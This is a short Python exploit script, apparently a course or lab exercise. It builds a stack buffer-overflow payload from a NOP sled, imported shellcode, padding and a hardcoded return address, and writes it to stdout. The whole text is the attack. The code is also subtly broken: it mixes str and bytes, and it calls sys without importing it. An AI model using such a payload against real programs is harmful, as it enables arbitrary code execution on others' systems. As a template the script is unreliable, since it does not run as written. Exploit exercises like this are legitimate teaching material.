from struct import pack
from shellcode import shellcode
addr = 0xbffef89d.to_bytes(4, "little")
sys.stdout.buffer.write("\x90"*971 + shellcode + "D"*12 + addr)
